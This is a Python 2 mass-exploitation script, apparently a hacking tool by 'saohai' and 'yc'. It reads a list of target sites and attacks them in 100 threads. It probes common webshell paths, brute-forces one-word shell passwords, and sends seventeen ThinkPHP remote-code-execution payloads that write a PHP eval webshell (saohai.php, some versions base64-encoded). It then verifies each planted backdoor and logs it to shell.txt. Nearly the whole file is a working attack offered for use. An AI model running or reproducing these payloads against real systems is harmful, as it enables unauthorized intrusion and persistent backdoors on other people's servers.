# -*- coding: utf-8 -*-
# hacklang1
# first check the typecho 
# check the houzhui and judge to php and asp
# if one's password in 500+,then to one password to find what it is


import json
import re
import datetime

import time
import requests
import smtplib
import email.mime.multipart
from email.mime.text import MIMEText
import email.mime.text
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import os
import sys
import json
import threading
import Queue
import ctypes


STD_INPUT_HANDLE = -10
STD_OUTPUT_HANDLE = -11
STD_ERROR_HANDLE = -12


FOREGROUND_BLACK = 0x00 # black.
FOREGROUND_DARKBLUE = 0x01 # dark blue.
FOREGROUND_DARKGREEN = 0x02 # dark green.
FOREGROUND_DARKSKYBLUE = 0x03 # dark skyblue.
FOREGROUND_DARKRED = 0x04 # dark red.
FOREGROUND_DARKPINK = 0x05 # dark pink.
FOREGROUND_DARKYELLOW = 0x06 # dark yellow.
FOREGROUND_DARKWHITE = 0x07 # dark white.
FOREGROUND_DARKGRAY = 0x08 # dark gray.
FOREGROUND_BLUE = 0x09 # blue.
FOREGROUND_GREEN = 0x0a # green.
FOREGROUND_SKYBLUE = 0x0b # skyblue.
FOREGROUND_RED = 0x0c # red.
FOREGROUND_PINK = 0x0d # pink.
FOREGROUND_YELLOW = 0x0e # yellow.
FOREGROUND_WHITE = 0x0f # white.



BACKGROUND_BLUE = 0x10 # dark blue.
BACKGROUND_GREEN = 0x20 # dark green.
BACKGROUND_DARKSKYBLUE = 0x30 # dark skyblue.
BACKGROUND_DARKRED = 0x40 # dark red.
BACKGROUND_DARKPINK = 0x50 # dark pink.
BACKGROUND_DARKYELLOW = 0x60 # dark yellow.
BACKGROUND_DARKWHITE = 0x70 # dark white.
BACKGROUND_DARKGRAY = 0x80 # dark gray.
BACKGROUND_BLUE = 0x90 # blue.
BACKGROUND_GREEN = 0xa0 # green.
BACKGROUND_SKYBLUE = 0xb0 # skyblue.
BACKGROUND_RED = 0xc0 # red.
BACKGROUND_PINK = 0xd0 # pink.
BACKGROUND_YELLOW = 0xe0 # yellow.
BACKGROUND_WHITE = 0xf0 # white.



# get handle
std_out_handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)

def set_cmd_text_color(color, handle=std_out_handle):
    Bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)
    return Bool

#reset white
def resetColor():
    set_cmd_text_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)

###############################################################


#dark blue
def printDarkBlue(mess):
    set_cmd_text_color(FOREGROUND_DARKBLUE)
    sys.stdout.write(mess)
    resetColor()


#dark green
def printDarkGreen(mess):
    set_cmd_text_color(FOREGROUND_DARKGREEN)
    sys.stdout.write(mess)
    resetColor()


#dark sky blue
def printDarkSkyBlue(mess):
    set_cmd_text_color(FOREGROUND_DARKSKYBLUE)
    sys.stdout.write(mess)
    resetColor()


#dark red
def printDarkRed(mess):
    set_cmd_text_color(FOREGROUND_DARKRED)
    sys.stdout.write(mess)
    resetColor()


#dark pink
def printDarkPink(mess):
    set_cmd_text_color(FOREGROUND_DARKPINK)
    sys.stdout.write(mess)
    resetColor()


#dark yellow
def printDarkYellow(mess):
    set_cmd_text_color(FOREGROUND_DARKYELLOW)
    sys.stdout.write(mess)
    resetColor()


#dark white
def printDarkWhite(mess):
    set_cmd_text_color(FOREGROUND_DARKWHITE)
    sys.stdout.write(mess)
    resetColor()


#dark gray
def printDarkGray(mess):
    set_cmd_text_color(FOREGROUND_DARKGRAY)
    sys.stdout.write(mess)
    resetColor()


#blue
def printBlue(mess):
    set_cmd_text_color(FOREGROUND_BLUE)
    sys.stdout.write(mess)
    resetColor()

#green
def printGreen(mess):
    set_cmd_text_color(FOREGROUND_GREEN)
    sys.stdout.write(mess)
    resetColor()


#sky blue
def printSkyBlue(mess):
    set_cmd_text_color(FOREGROUND_SKYBLUE)
    sys.stdout.write(mess)
    resetColor()


#red
def printRed(mess):
    set_cmd_text_color(FOREGROUND_RED)
    sys.stdout.write(mess)
    resetColor()


#pink
def printPink(mess):
    set_cmd_text_color(FOREGROUND_PINK)
    sys.stdout.write(mess)
    resetColor()


#yellow
def printYellow(mess):
    set_cmd_text_color(FOREGROUND_YELLOW)
    sys.stdout.write(mess)
    resetColor()


#white
def printWhite(mess):
    set_cmd_text_color(FOREGROUND_WHITE)
    sys.stdout.write(mess)
    resetColor()

##################################################


#white bkground and black text
def printWhiteBlack(mess):
    set_cmd_text_color(FOREGROUND_BLACK | BACKGROUND_WHITE)
    sys.stdout.write(mess)
    resetColor()


#white bkground and black text
def printWhiteBlack_2(mess):
    set_cmd_text_color(0xf0)
    sys.stdout.write(mess)
    resetColor()



#white bkground and black text
def printYellowRed(mess):
    set_cmd_text_color(BACKGROUND_YELLOW | FOREGROUND_RED)
    sys.stdout.write(mess)
    resetColor()



fx = open('shell.txt','a')
que = Queue.Queue()
reload(sys)
sys.setdefaultencoding('utf8')


headers={
	'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
	"Content-Type": "application/x-www-form-urlencoded"
}

fp = open('url.txt','r')
lis = fp.readlines()

all_traces=[
'/lx.php','/cnm.php','/shell.php','/tp_exp.php','/paylog.php'
]

data_php={'x':'echo "z+=";','20278':'echo "z+=";','nicao4':'echo "z+=";','a':'echo "z+=";','value':'echo "z+=";','dong':'echo "z+=";','lx':'echo "z+=";','admin':'echo "z+=";'}

one_password=[
'admin',
'dong',
'value',
'lx',
'a',
'x',
'20208',
'nicai4'
]

	



def url_encoder(url):#http://***.com
	url = url.replace("\n","")
	url = url if url.startswith("http") else 'http://'+url 
	if (url[len(url)-1]=='/'):
		url = url[0:len(url)-1]
	return url
	
	
for raw in lis:
	raw = raw.replace("\n","")
	que.put(raw)

def show():
	for th in range(100):
		thr = threading.Thread(target=begin)
		thr.start()
		
		
def thread_exploite(url):
	for password_php in one_password:
		password_php = password_php.replace("\n","")
		data_php={password_php:'echo "z+=";'}
		try:
			html_php = requests.post(url=url,headers=headers,data=data_php,timeout=3)
			if (html_php.text.find("z+=")>=0):
				fx.write(str(url)+"|"+password_php+"\n")
				#send_email(str(url)+"|"+password_php)
				printGreen("[+]"+url+"|"+password_php+"\n")
				#send_email_3(str(shell+password_php))
			else:
				pass
		except:
			pass
	
def boju(url):
	for trace in all_traces:
		trace=trace.replace("\n","")
		url_true=url+trace
		html = requests.post(url_true,headers=headers,timeout=5,data=data_php,allow_redirects=False)
		if html.status_code!=200:
			pass
		else:
			thread_exploite(url_true)
			
		
def begin():
	while not que.empty():
		url = que.get()
		url = url_encoder(url)
		try:
			boju(url)
		except:
			pass
		try:
			main(url)
		except:
			pass
def main(url):
	a="/index.php/?s=index/\\think\\app/invokefunction&function=assert&vars[0]=${@print(eval(phpinfo().fputs(fopen('saohai.php','w'),base64_decode('U2FvSGFpPD9waHAgQGV2YWwoJF9QT1NUWydoaSddKTs/Pg=='))))}"
	b="/index.php/?s=index/\\think\\app/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php','w'),'SaoHai<?php @eval($_POST['hi']);?>');"
	c="/index.php/?s=index/\\think\\template\\driver\\file/write&cacheFile=saohai.php&content=SaoHai%3C?php%20eval($_POST['hi']);?%3E"
	d="/index.php/?s=index/\\think\\app/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php','w'),'SaoHai<?php @eval($_POST['hi']);?>');"
	e="/index.php/?s=index/\\think\\view\\driver\\Php/display&content=<?php fputs(fopen('saohai.php','w'),base64_decode('U2FvSGFpPD9waHAgQGV2YWwoJF9QT1NUWydoaSddKTs/Pg=='));?>"
	f="/index.php/?s=index/\\think\\template\\driver\\file/write&cacheFile=saohai.php&content=SaoHai<?php @eval($_POST['hi']);?>"
	g="/index.php/?s=index/\\think\\Container/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php','w'),'SaoHai<?php @eval($_POST['hi']);?>')"
	h="/index.php/?s=index/\\think\\app/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php','w'),'SaoHai<?php @eval($_POST['hi']);?>');"
	i="/index.php?s=index/\\think\\app/invokefunction&function=assert&vars[0]=${@print(eval(phpinfo().fputs(fopen('saohai.php','w'),base64_decode('U2FvSGFpPD9waHAgQGV2YWwoJF9QT1NUWydoaSddKTs/Pg=='))))}"
	j="/index.php?s=index/\\think\\app/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php','w'),'SaoHai<?php @eval($_POST['hi']);?>');"
	k="/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=saohai.php&content=SaoHai<?php eval($_POST['hi']);?>"
	l="/index.php?s=index/\\think\\app/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php','w'),'SaoHai<?php @eval($_POST['hi']);?>');"
	m="/index.php?s=index/\\think\\view\\driver\\Php/display&content=<?php fputs(fopen('saohai.php','w'),base64_decode('U2FvSGFpPD9waHAgQGV2YWwoJF9QT1NUWydoaSddKTs/Pg=='));?>"
	n="/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=saohai.php&content=SaoHai<?php @eval($_POST['hi']);?>"
	o="/index.php?s=index/\\think\\Container/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php','w'),'SaoHai<?php @eval($_POST['hi']);?>')"
	p="/index.php?s=index/\\think\\app/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php','w'),'SaoHai<?php @eval($_POST['hi']);?>');"
	z="/index.php?s=index/\\think\\app/invokefunction&function=assert&vars[0]=${@print(eval(phpinfo().fputs(fopen('saohai.php','w'),base64_decode('U2FvSGFpPD9waHAgQGV2YWwoJF9QT1NUWydoaSddKTs/Pg=='))))}"
	#url = "http://www.sunxingl.com"
	lists=[] 
	lists.append(url+a)
	lists.append(url+b)
	lists.append(url+c)
	lists.append(url+d)
	lists.append(url+e)
	lists.append(url+f)
	lists.append(url+g)
	lists.append(url+h)
	lists.append(url+i)
	lists.append(url+j)
	lists.append(url+k)
	lists.append(url+l)
	lists.append(url+m)
	lists.append(url+n)
	lists.append(url+o)
	lists.append(url+p)
	lists.append(url+z)
	for rea in lists:
		
		html=requests.get(url=rea,headers=headers,timeout=3,allow_redirects=False)
		if html.status_code==200:#this website not refuse
			shell = url+"/saohai.php"
			try:
				
				html1 = requests.get(shell,headers=headers,timeout=3,allow_redirects=False)
				if html1.status_code==200 and html1.text.find("Sao")>=0:
					try:
						if html1.text.find("Sao")>=0:
							printGreen("[+]"+shell+"|hi"+"\n")
							fx.write(str(shell)+"|hi"+"\n")
							#send_email(str(shell+"|hi"))
							#send_email_3(str(shell+"|hi"))
						else:
							pass
					except:
						pass
				else:
					printDarkYellow("[-]Can't write shell"+"\n")
			except:
				pass

def yc():
    logostr = """\033[1;32;40m
0000     0000 000000000000 0000        0000	   000	     0000000000000
 000    000   000	   00000      00000	 0000000     000       000
  00    00    00	   00 00      00 00    00      00    00		00
   00  00     00	   00  00    00  00   00        00   00		00
    0000      000000000000 00   00  00	 00  00000000000000  00		00
     00	      00	   00	0000	 00 000          000 00		00
     00       00	   00	 00	 00 000		 000 00		00
     00       000	   00		 00 00		  00 000       000
     00       000000000000 00		 00 00		  00 0000000000000

	 {Author:saohai,yc   Version 2.1   QQ:3365487579,2187361334}            
"""  
    print logostr	
	
	
if __name__ == '__main__':
	yc()
	mi = raw_input("Input password: ")
	if mi=="hai+yc=wudi123":
		
		try:	
			show()
		except:
			pass
	else:
		printDarkWhite("[-]Bad password\n")
